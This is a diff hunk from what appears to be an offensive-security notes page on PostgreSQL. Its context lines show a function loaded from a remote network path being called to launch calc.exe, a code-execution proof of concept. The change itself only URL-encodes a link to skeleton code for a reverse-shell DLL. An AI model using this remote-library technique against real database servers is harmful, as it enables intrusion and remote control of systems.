@@ -170,4 +170,4 @@ CREATE OR REPLACE FUNCTION remote_test(text, integer) RETURNS void AS $$\\192.16
 SELECT remote_test($$calc.exe$$, 3);
 ```
 
-See [PostgreSQL Extensions](/skeleton-scripts/PostgreSQL Extensions/) for skeleton code for a reverse shell DLL.
+See [PostgreSQL Extensions](/skeleton-scripts/PostgreSQL%20Extensions/) for skeleton code for a reverse shell DLL.
